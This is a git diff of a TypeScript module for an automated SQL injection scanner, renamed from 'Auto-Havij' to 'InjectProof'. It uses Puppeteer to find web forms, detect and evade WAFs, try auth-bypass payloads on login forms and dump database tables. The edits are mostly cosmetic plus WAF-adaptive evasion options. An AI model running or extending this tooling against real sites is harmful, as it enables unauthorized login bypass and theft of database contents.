@@ -1,4 +1,4 @@
-// VibeCode โ€” Smart Form SQLmap Engine (Auto-Havij/SQLmap Level)
+// InjectProof — Smart Form SQLi Engine
 // Puppeteer-based fully automated form SQLi detection + exploitation
 // Discovers forms (including JS/AJAX/onclick), classifies them,
 // bypasses WAFs, exploits SQLi, and dumps database contents automatically.
@@ -161,7 +161,7 @@ export class SmartFormScanner {
         this.log.push({ ts: Date.now(), phase, msg, detail });
     }
 
-    // โ”€โ”€ PUBLIC: Run full scan on a URL โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€
+    // ── PUBLIC: Run full scan on a URL ────────────────────────
     async scanUrl(url: string): Promise<SmartFormScanResult> {
         const results: DetectorResult[] = [];
         let exploitData: SqliExploitResult | undefined;
@@ -219,13 +219,13 @@ export class SmartFormScanner {
                     continue;
                 }
 
-                // Phase 3a: Login forms โ’ Auth Bypass first
+                // Phase 3a: Login forms → Auth Bypass first
                 if (form.formType === 'login') {
                     const bypassResult = await this.attemptAuthBypass(page, form, url);
                     if (bypassResult) {
                         results.push(bypassResult);
                         this.authBypassed = true;
-                        this.addLog('auth-bypass', '๐”“ AUTH BYPASS SUCCESSFUL!');
+                        this.addLog('auth-bypass', '🥳 AUTH BYPASS SUCCESSFUL!');
                     }
                 }
 
@@ -235,9 +235,9 @@ export class SmartFormScanner {
                     if (probeResult) {
                         results.push(probeResult.result);
 
-                        // Phase 3c: Deep exploitation (Auto-Havij)
+                        // Phase 3c: InjectProof deep exploitation
                         if (this.config.enableDeepExploit !== false && probeResult.technique) {
-                            this.addLog('exploit', `Starting deep exploitation via ${probeResult.technique}`);
+                            this.addLog('exploit', `Starting InjectProof deep exploitation via ${probeResult.technique}`);
                             try {
                                 const exploit = await this.deepExploitViaForm(page, form, field, probeResult.technique, url);
                                 if (exploit) {
@@ -290,7 +290,7 @@ export class SmartFormScanner {
         };
     }
 
-    // โ”€โ”€ WAF Detection โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€
+    // ── WAF Detection ──────────────────────────────────────────
     private async detectWaf(page: Page, url: string): Promise<WafType> {
         try {
             // Send a canary probe that WAFs usually block
@@ -329,7 +329,7 @@ export class SmartFormScanner {
         }
     }
 
-    // โ”€โ”€ Form Discovery (DOM + MutationObserver + Shadow DOM) โ”€โ”€โ”€โ”€
+    // ── Form Discovery (DOM + MutationObserver + Shadow DOM) ──
     private async discoverForms(page: Page, baseUrl: string): Promise<SmartFormTarget[]> {
         const forms: SmartFormTarget[] = [];
 
@@ -492,7 +492,7 @@ export class SmartFormScanner {
         return forms;
     }
 
-    // โ”€โ”€ Form Classification โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€
+    // ── Form Classification ────────────────────────────────────
     private classifyForm(fields: Array<{ name: string; type: string; placeholder: string }>): FormType {
         const names = fields.map(f => f.name.toLowerCase());
         const types = fields.map(f => f.type.toLowerCase());
@@ -526,7 +526,7 @@ export class SmartFormScanner {
         return f.type === 'password' || n.includes('user') || n.includes('email') || n.includes('login') || n.includes('pass');
     }
 
-    // โ”€โ”€ Auth Bypass โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€
+    // ── Auth Bypass ────────────────────────────────────────────
     private async attemptAuthBypass(page: Page, form: SmartFormTarget, url: string): Promise<DetectorResult | null> {
         this.addLog('auth-bypass', `Attempting auth bypass on login form (${AUTH_BYPASS_PAYLOADS.length} payloads)`);
 
@@ -570,7 +570,7 @@ export class SmartFormScanner {
                     const cvssMetrics = COMMON_CVSS_VECTORS.sqli;
                     const cvssScore = calculateCvssScore(cvssMetrics);
 
-                    this.addLog('auth-bypass', `๐”“ BYPASS SUCCESS with payload: ${payload}`, `Redirected to: ${afterUrl}`);
+                    this.addLog('auth-bypass', `🥳 BYPASS SUCCESS with payload: ${payload}`, `Redirected to: ${afterUrl}`);
 
                     return {
                         found: true,
@@ -613,7 +613,7 @@ export class SmartFormScanner {
         return null;
     }
 
-    // โ”€โ”€ Field Probing (detect SQLi type) โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€
+    // ── Field Probing (detect SQLi type) ───────────────────────
     private async probeField(page: Page, form: SmartFormTarget, field: SmartField, url: string): Promise<{ result: DetectorResult; technique: AttackTechnique } | null> {
         this.addLog('probe', `Probing field "${field.name}" in ${form.formType} form`);
 
@@ -742,10 +742,10 @@ export class SmartFormScanner {
         return null;
     }
 
-    // โ”€โ”€ Deep Exploit via Puppeteer (Auto-Havij) โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€
+    // ── Deep Exploit (InjectProof Engine) ─────────────────────
     private async deepExploitViaForm(page: Page, form: SmartFormTarget, field: SmartField, technique: AttackTechnique, url: string): Promise<SqliExploitResult | null> {
-        // Delegate to the existing deep exploiter but use HTTP (since we confirmed the vuln via form)
-        // The existing sqli-exploiter.ts uses fetch() which works for extraction
+        // Delegate to the InjectProof deep exploitation engine
+        // Passes detected WAF type for adaptive evasion during extraction
         try {
             const result = await deepExploitSqli(
                 form.action || url,
@@ -761,6 +761,8 @@ export class SmartFormScanner {
                     maxTablesPerDb: 100,
                     maxColumnsPerTable: 50,
                     maxRowsPerTable: 20,
+                    wafType: this.detectedWaf !== 'none' ? this.detectedWaf : undefined,
+                    preferredTechnique: technique as any,
                 },
             );
             return result;
